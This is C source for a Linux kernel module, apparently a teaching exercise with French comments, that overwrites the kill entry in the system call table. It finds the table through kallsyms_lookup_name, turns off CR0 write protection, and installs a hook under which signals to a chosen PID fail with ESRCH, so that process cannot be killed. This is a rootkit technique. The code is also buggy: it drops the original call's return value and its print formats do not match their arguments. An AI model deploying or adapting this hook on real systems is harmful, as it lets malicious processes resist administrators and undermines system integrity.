#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/kallsyms.h>
#include <linux/unistd.h>

MODULE_DESCRIPTION("Module contenant modifiant un appel système");
MODULE_AUTHOR("Adrian SATIN");
MODULE_LICENSE("GPL");

static int hide_pid = 0;
module_param(hide_pid, int, 0660);
MODULE_PARM_DESC(hide_pid, "Pid to hide from kill syscall");

asmlinkage unsigned long **syscall_table = NULL;

asmlinkage int (*sys_kill_bk)(pid_t pid, int sig);

static asmlinkage int my_sys_kill(pid_t pid, int sig)
{
	pr_info("My sys kill\n");
	if (pid == hide_pid) {
		pr_info("Intercepted kill\n");
		return -ESRCH;
	} else {
		pr_info("Old sys kill for %ld\n", pid);
		(*sys_kill_bk)(pid, sig);
		pr_info("After \n");
		return 0;
	}
}

static unsigned long find_sys_call_table(void)
{
	// Aucun syscall ne semble être exporté... => grep -R "EXPORT_SYMBOL.*sys_" *
	// Nous utilisons donc kallsyms_lookup_name
	return kallsyms_lookup_name("sys_call_table");
}

static int __init poison_init(void)
{
	unsigned long cr0;
	syscall_table = find_sys_call_table();
	pr_info("Table find at %x poissonned pid %ld kill bk %x kill new %x\n",
		syscall_table, syscall_table, hide_pid, sys_kill_bk,
		syscall_table[__NR_kill]);

	// Remove write protection
	cr0 = read_cr0() & (~0x10000);
	write_cr0(cr0);
	// Change syscall kill
	sys_kill_bk = (void *)syscall_table[__NR_kill];
	syscall_table[__NR_kill] = (unsigned long *)my_sys_kill;
	// Add write protection
	cr0 = read_cr0() | 0x10000;
	write_cr0(cr0);

	pr_info("Table find at %x poissonned pid %ld kill bk %x kill new %x\n",
		syscall_table, syscall_table, hide_pid, sys_kill_bk,
		syscall_table[__NR_kill]);

	return 0;
}
module_init(poison_init);

static void __exit poison_exit(void)
{
	unsigned long cr0;
	// Dé-poison
	// Remove write protection
	cr0 = read_cr0() & (~0x10000);
	write_cr0(cr0);
	// Change syscall kill
	syscall_table[__NR_kill] = (unsigned long *)sys_kill_bk;
	// Add write protection
	cr0 = read_cr0() | 0x10000;
	write_cr0(cr0);
}
module_exit(poison_exit);
